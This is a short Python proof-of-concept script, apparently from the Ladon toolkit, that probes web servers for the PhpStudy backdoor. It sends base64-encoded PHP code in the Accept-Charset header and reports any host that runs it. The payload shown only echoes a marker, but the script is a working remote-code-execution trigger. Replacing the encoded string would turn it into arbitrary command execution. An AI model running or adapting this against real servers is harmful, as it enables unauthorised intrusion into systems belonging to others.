#Ladon Poc PhpStudyDoor 
#Author: K8gege
#Date: 20191120
import socket
import sys
import requests
import base64
url = sys.argv[1]
def checkpoc(url):
	try:
		payload = "ZWNobyAiSVNEb29yT0siOw=="
		headers = {
			'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',
			'Accept-Encoding':'gzip,deflate',
			'Accept-Charset':payload
		}
		html = requests.get(url,headers=headers,verify=False,timeout=5)
		if "ISDoorOK" in html.text:
			print url+"\tPhpStudyDoor"
	except:
		pass

if "http" in url:
	checkpoc(url)
else:
	checkpoc("http://"+url+"/index.php")
	checkpoc("http://"+url+":8080/index.php")
	checkpoc("https://"+url+"/index.php")

